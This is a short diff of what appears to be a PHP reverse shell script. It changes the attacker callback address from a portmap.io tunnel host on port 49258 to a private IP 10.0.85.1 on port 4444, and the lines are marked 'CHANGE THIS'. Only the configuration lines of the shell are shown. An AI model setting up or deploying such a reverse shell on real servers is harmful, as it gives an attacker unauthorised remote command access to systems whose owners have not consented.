@@ -47,8 +47,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = 'tcp://NyiMInHtet-49258.portmap.io';  // CHANGE THIS
-$port = 49258;       // CHANGE THIS
+$ip = '10.0.85.1';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
